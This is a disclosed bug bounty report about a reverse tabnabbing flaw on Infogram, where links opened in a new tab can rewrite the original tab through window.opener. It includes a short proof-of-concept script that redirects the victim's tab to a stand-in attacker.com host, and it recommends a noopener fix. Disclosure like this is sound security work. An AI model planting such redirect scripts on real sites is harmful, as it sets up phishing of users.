# Tabnabbing via window.opener

## Report Details
- **Report ID**: 280500
- **URL**: https://hackerone.com/reports/280500
- **State**: Closed
- **Severity**: low
- **Submitted**: 2017-10-19T13:35:13.660Z
- **Disclosed**: 2017-11-06T09:04:32.241Z

## Reporter
- **Username**: mr_r3boot
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: infogram

## Vulnerability Information
Hi Team, i would like to report tab nabbing issue on your domain.

#Details:

When you open a link in a new tab ( target="_blank" ), the page that opens in a new tab can access the initial tab and change it's location using the window.opener property.

#PoC:

1.Navigate to ```https://infogram.com/app/[userproject]```.
2. Provide any url as evil url. http://test.com/test.html test.html contains following code.

```
<html>
<script>
if (window.opener) window.opener.parent.location.replace('http://attacker.com');
if (window.parent != window) window.parent.location.replace('http://attacker.com');
</script>
blah
</html>
```
Also check Open link in new tab

The javascript code that does all the magic: 
```window.opener.location.replace(newURL);```
my link will open in new tab and original tab will be replaced with attacker malicious link.

#Fix:

In order to mitigate this issue, developers are encouraged to use rel="nofollow noopener noreferrer" as follows:

```
<a target="_blank" class="btn external-url" href="https://evil.com" rel="nofollow noopener noreferrer"><i class="fa fa-external-link"></i>
</a>
```

Let me know if u have problems in reproducing the issue.

Regards,
Mr.R3boot.

## Attachments
- TabNabbing.mp4
